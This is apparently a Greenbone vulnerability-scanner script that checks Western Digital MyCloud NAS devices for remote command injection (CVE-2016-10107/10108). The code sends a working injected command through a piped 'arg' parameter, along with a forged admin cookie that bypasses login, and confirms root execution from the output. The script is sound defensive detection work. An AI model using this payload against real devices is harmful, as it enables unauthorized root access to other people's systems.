# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:wdc";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108035");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2016-10107", "CVE-2016-10108");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-01-04 10:00:00 +0100 (Wed, 04 Jan 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-01-05 02:59:00 +0000 (Thu, 05 Jan 2017)");
  script_name("Western Digital MyCloud Products Multiple Remote Command Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mycloud_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wd-mycloud/http/detected");

  script_xref(name:"URL", value:"http://support.wdc.com/downloads.aspx?lang=en#firmware");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/95200");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/95201");
  script_xref(name:"URL", value:"https://www.stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/");

  script_tag(name:"summary", value:"Western Digital My Cloud Products are prone to multiple remote command injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands with root privileges
  in context of the affected application.");

  script_tag(name:"insight", value:"It is possible to inject arbitrary commands via:

  - a modified cookie header to the index.php page

  - a modified arg parameter in the POST data to the /web/google_analytics.php page");

  script_tag(name:"solution", value:"The vendor has released firmware updates. Please see the reference for more details
  and downloads.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("list_array_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

CPE = infos["cpe"];
if( ! CPE || ( "my_cloud" >!< CPE && "wd_cloud" >!< CPE ) )
  exit( 0 );

port = infos["port"];

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/web/google_analytics.php";
data = "cmd=set&opt=cloud-device-num&arg=0|echo%20`id`%20%23";
cookie = "isAdmin=1; username=admin; local_login=1; fw_version=2.11.142";

req = http_post_put_req( port:port, url:url, data:data,
                     accept_header:"application/xml, text/xml, */*; q=0.01",
                     add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded", "X-Requested-With", "XMLHttpRequest", "Cookie", cookie ) );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( res =~ "HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+" ) {

  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );

  info['"HTTP POST" body'] = data;
  info['Cookie'] = cookie;
  info['URL'] = http_report_vuln_url( port:port, url:url, url_only:TRUE );

  report  = 'By doing the following request:\n\n';
  report += text_format_table( array:info ) + '\n\n';
  report += 'it was possible to execute the "id" command.';
  report += '\n\nResult: ' + uid[1];

  expert_info = 'Request:\n'+ req + 'Response:\n' + res;
  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
